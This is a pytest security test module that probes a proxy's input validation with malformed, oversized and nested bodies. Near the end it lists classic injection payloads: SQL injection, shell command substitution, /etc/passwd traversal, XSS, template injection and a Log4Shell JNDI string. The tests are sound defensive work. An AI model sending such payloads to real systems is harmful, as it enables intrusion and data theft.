"""Adversarial probes of the frontend proxy's input hardening.

Every route under `map/app/api/` is reachable without a credential by design —
the pipeline is keyless and guests are supported. That makes the input guard in
`map/lib/proxyGuard.ts` the only thing standing between a hostile caller and an
expensive upstream fan-out, so it gets tested like a security boundary.

A clean 4xx is the PASS condition throughout. A 500, a hang, or an error body
carrying internals is the failure being hunted.
"""
import json

import pytest

from conftest import SLOW_TIMEOUT

pytestmark = [pytest.mark.integration, pytest.mark.security]

# Routes that accept a JSON POST body and share the same guard.
JSON_POST_ROUTES = ["/api/run-pipeline", "/api/run-pipeline-stream", "/api/partnerships"]

# Substrings that must never appear in a client-visible error body. If any of
# these leak, an attacker learns about the internals for free.
LEAK_MARKERS = [
    "Traceback",
    "/Users/",
    "/var/task",
    "node_modules",
    "aria_pi",
    "at Object.",
    "ECONNREFUSED",
    "127.0.0.1:8000",
    "localhost:8000",
]


def assert_no_internal_leak(response):
    """Assert an error body exposes nothing about the internals.

    Takes: response — a requests.Response from a failing call.
    Gives: nothing; raises AssertionError naming the leaked marker.
    """
    body = response.text
    for marker in LEAK_MARKERS:
        assert marker not in body, f"error body leaked {marker!r}: {body[:400]}"


@pytest.mark.parametrize("route", JSON_POST_ROUTES)
def test_malformed_json_is_rejected_cleanly(frontend, route):
    """Reject unparseable JSON with a 400, not a crash.

    Takes: frontend — the proxy client; route — the POST route under test.
    Gives: nothing; asserts a 400 and a clean error body.
    """
    r = frontend.post(route, data="{not valid json", headers={"Content-Type": "application/json"})
    assert r.status_code == 400, f"{route} returned {r.status_code} for malformed JSON"
    assert_no_internal_leak(r)


@pytest.mark.parametrize("route", JSON_POST_ROUTES)
def test_oversized_body_is_rejected_before_upstream(frontend, route):
    """Reject a body past the 16 KB cap with a 413.

    Takes: frontend — the proxy client; route — the POST route under test.
    Gives: nothing; asserts a 413 so the cap runs before any upstream work.
    """
    payload = json.dumps({"sector": "x" * 40_000, "query": "x" * 40_000})
    r = frontend.post(route, data=payload, headers={"Content-Type": "application/json"})
    assert r.status_code == 413, f"{route} returned {r.status_code} for a 40 KB body"
    assert_no_internal_leak(r)


@pytest.mark.parametrize(
    "body",
    [
        {},                                   # required field absent
        {"sector": ""},                       # empty string
        {"sector": "   "},                    # whitespace collapses to empty
        {"sector": None},                     # null
        {"sector": 42},                       # wrong scalar type
        {"sector": ["a", "b"]},               # array where string expected
        {"sector": {"nested": "object"}},     # object where string expected
        {"sector": "x" * 500},                # past the 200-char bound
    ],
    ids=["missing", "empty", "whitespace", "null", "int", "array", "object", "too-long"],
)
def test_pipeline_rejects_bad_sector_shapes(frontend, body):
    """Reject every malformed `sector` shape with a 400.

    Takes: frontend — the proxy client; body — one malformed request body.
    Gives: nothing; asserts a 400 rather than a 5xx or an upstream call.
    """
    r = frontend.post("/api/run-pipeline", json=body)
    assert r.status_code == 400, f"body {body!r} returned {r.status_code}"
    assert_no_internal_leak(r)


@pytest.mark.parametrize(
    "companies",
    [
        ["ok"] * 26,          # past the 25-item fan-out cap
        [""],                 # empty member
        [None],               # null member
        [123],                # wrong member type
        ["x" * 200],          # member past the 120-char bound
        [["nested"]],         # nested array member
    ],
    ids=["too-many", "empty", "null", "int", "too-long", "nested"],
)
def test_pipeline_bounds_the_companies_fanout(frontend, companies):
    """Reject company lists that would widen the upstream fan-out.

    Takes: frontend — the proxy client; companies — one malformed list.
    Gives: nothing; asserts a 400 so fan-out cost stays bounded.
    """
    r = frontend.post("/api/run-pipeline", json={"sector": "oncology", "companies": companies})
    assert r.status_code == 400, f"companies={companies!r} returned {r.status_code}"
    assert_no_internal_leak(r)


def test_empty_body_is_rejected(frontend):
    """Reject a completely empty POST body with a 400.

    Takes: frontend — the proxy client.
    Gives: nothing; asserts a 400 rather than an unhandled parse error.
    """
    r = frontend.post("/api/run-pipeline", data="", headers={"Content-Type": "application/json"})
    assert r.status_code == 400
    assert_no_internal_leak(r)


def test_wrong_content_type_does_not_crash(frontend):
    """Survive a body sent under the wrong Content-Type.

    Takes: frontend — the proxy client.
    Gives: nothing; asserts a 4xx, never a 5xx.
    """
    r = frontend.post(
        "/api/run-pipeline",
        data="sector=oncology",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    assert 400 <= r.status_code < 500, f"expected 4xx, got {r.status_code}"
    assert_no_internal_leak(r)


def test_deeply_nested_json_does_not_blow_the_stack(frontend):
    """Survive a deeply nested JSON body without a 5xx.

    Takes: frontend — the proxy client.
    Gives: nothing; asserts a 4xx from the size or shape guard.
    """
    depth = 400
    payload = "[" * depth + "]" * depth
    r = frontend.post("/api/run-pipeline", data=payload, headers={"Content-Type": "application/json"})
    assert 400 <= r.status_code < 500, f"expected 4xx, got {r.status_code}"
    assert_no_internal_leak(r)


def test_duplicate_json_keys_resolve_to_the_last_value(frontend):
    """Handle duplicate JSON keys without ambiguity or error.

    Takes: frontend — the proxy client.
    Gives: nothing; asserts the request is not a 5xx, so parsing is decided.
    """
    payload = '{"sector": "oncology", "sector": ""}'
    r = frontend.post("/api/run-pipeline", data=payload, headers={"Content-Type": "application/json"})
    assert r.status_code < 500, f"duplicate keys produced {r.status_code}"
    assert_no_internal_leak(r)


@pytest.mark.parametrize(
    "hostile",
    [
        "'; DROP TABLE companies; --",
        "$(whoami)",
        "`id`",
        "../../../../etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "\x00nullbyte",
        "<script>alert(1)</script>",
        "{{7*7}}",
        "${jndi:ldap://x/a}",
    ],
    ids=["sqli", "cmdsub", "backtick", "traversal", "encoded-traversal",
         "nullbyte", "xss", "template", "log4shell"],
)
@pytest.mark.slow
def test_hostile_sector_strings_never_500(frontend, hostile):
    """Treat injection-flavored input as ordinary text, never as code.

    These strings are *valid* input (non-empty, under the length bound), so they
    pass the guard and reach the real upstream fan-out — hence the slow budget.
    That they are expensive rather than rejected is itself worth knowing: an
    unrecognized sector buys an attacker a full SEC discovery pass.

    Takes: frontend — the proxy client; hostile — one injection payload.
    Gives: nothing; asserts no 5xx and no internal leak.
    """
    r = frontend.post("/api/run-pipeline", json={"sector": hostile}, timeout=SLOW_TIMEOUT)
    assert r.status_code < 500, f"{hostile!r} produced {r.status_code}"
    assert_no_internal_leak(r)
